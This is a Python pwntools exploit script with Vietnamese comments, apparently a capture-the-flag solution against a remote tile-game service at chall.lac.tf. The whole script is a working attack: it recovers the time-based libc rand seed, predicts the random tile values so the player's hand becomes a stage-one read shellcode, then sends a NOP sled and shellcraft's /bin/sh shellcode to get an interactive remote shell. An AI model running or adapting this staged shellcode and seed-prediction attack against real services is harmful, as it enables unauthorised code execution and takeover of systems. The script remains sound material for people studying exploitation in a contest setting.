from pwn import *
import ctypes
import time

# Cấu hình binary
exe = ELF("./chall")
context.binary = exe
context.log_level = "info"

# Load libc
try:
    libc = ctypes.CDLL("libc.so.6")
except:
    try:
        libc = ctypes.CDLL("/lib/x86_64-linux-gnu/libc.so.6")
    except:
        log.error("Không tìm thấy libc! Hãy kiểm tra đường dẫn.")
        exit(1)

def solve():
    # p = process("./chall") 
    p = remote("chall.lac.tf", 31338) # Chạy remote

    # 1. Lấy trạng thái bài (Initial Hand)
    p.recvuntil(b"Your starting tiles:")
    p.recvline() 
    p.recvline() 
    
    line = p.recvline().decode().strip()
    
    initial_hand = []
    parts = line.split('|')
    for x in parts:
        clean_x = x.strip()
        if clean_x:
            try:
                initial_hand.append(int(clean_x, 16))
            except ValueError:
                continue
    
    log.info(f"Initial hand: {[hex(x) for x in initial_hand]}")

    # 2. Brute-force Seed
    # Remote có thể lệch giờ, tăng range lên một chút nếu cần
    now = int(time.time())
    seed = None
    search_range = range(now - 300, now + 300) 
    
    log.info("Đang brute-force seed...")
    for t in search_range:
        libc.srand(t)
        candidate = [libc.rand() & 0xFF for _ in range(14)]
        if candidate == initial_hand:
            seed = t
            log.success(f"Found seed: {seed}")
            break
            
    if seed is None:
        log.error("Không tìm thấy seed!")
        return

    # 3. Đồng bộ trạng thái RNG
    libc.srand(seed)
    for _ in range(14):
        libc.rand()

    # 4. Chuẩn bị Shellcode Stage 1 (11 bytes)
    # Shellcode: read(0, 0x13370000, 0xffff)
    stage1 = b"\x96\x31\xc0\x31\xff\x66\xba\xff\xff\x0f\x05"
    while len(stage1) < 14:
        stage1 += b"\x90"
        
    target_hand = list(stage1)
    log.info(f"Target payload: {[hex(x) for x in target_hand]}")

    # 5. Tính toán toàn bộ nước đi (OFFLINE CALCULATION)
    current_hand_sim = list(initial_hand)
    payload_buffer = b"" # Dùng biến này để chứa toàn bộ lệnh gửi đi
    
    total_swaps = 0
    for idx in range(14):
        needed = target_hand[idx]
        while current_hand_sim[idx] != needed:
            # Dự đoán số random tiếp theo
            r = libc.rand() & 0xFF
            
            # Thay vì gửi ngay, ta nối vào buffer
            # Chọn '1' (Swap) -> Chọn index -> (Server tự swap)
            payload_buffer += f"1\n{idx}\n".encode()
            
            current_hand_sim[idx] = r
            total_swaps += 1
            
    log.info(f"Cần thực hiện tổng cộng {total_swaps} lần swap.")
    
    # 6. Gửi lệnh Play (2) sau khi swap xong
    payload_buffer += b"2\n"

    # 7. Gửi toàn bộ lệnh Swap + Play một lần (PIPELINING)
    log.info("Đang gửi toàn bộ lệnh swap...")
    p.send(payload_buffer)

    # 8. Chuẩn bị Stage 2 (NOP Sled + /bin/sh)
    # Vì ta gửi dồn dập, server sẽ xử lý rất nhanh.
    # Ta cần đợi một chút để server thực thi đến lệnh syscall read() của Stage 1.
    
    # Payload Stage 2
    nop_sled = b"\x90" * 100
    real_shellcode = asm(shellcraft.sh())
    final_payload = nop_sled + real_shellcode

    # Thời gian sleep này quan trọng:
    # Đợi server xử lý hết đống input swap phía trên và chạy vào shellcode stage 1.
    # Với 3000-4000 swaps, server xử lý mất khoảng 0.5s - 1s tùy CPU.
    time.sleep(1) 
    
    log.info("Đang gửi Stage 2 shellcode...")
    p.send(final_payload)

    # 9. Nhận Shell
    # Lúc này buffer nhận của pwntools sẽ đầy ắp text của game, ta có thể clean nó
    p.clean() 
    p.interactive()

if __name__ == "__main__":
    solve()